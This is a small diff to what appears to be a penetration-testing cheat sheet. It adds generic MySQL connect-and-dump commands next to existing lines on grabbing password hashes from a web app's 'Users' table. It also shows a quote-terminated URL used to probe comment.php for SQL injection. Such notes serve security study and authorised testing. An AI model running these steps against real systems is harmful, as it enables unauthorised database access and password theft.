@@ -25,6 +25,12 @@ Grab password hashes from a web application mysql database called “Users” - 
     # show tables;
     # select * from users;
     
+Connect to MySQL
+    # mysql -u username -p password -h <IP ADDRESS>
+    # show databases;
+    # show tables;
+        # select * from <DatabaseName>;
+    
 -------------------- Enumerating the Database --------------------
 Enumerating the Database
     http://$ip/comment.php?id=738’
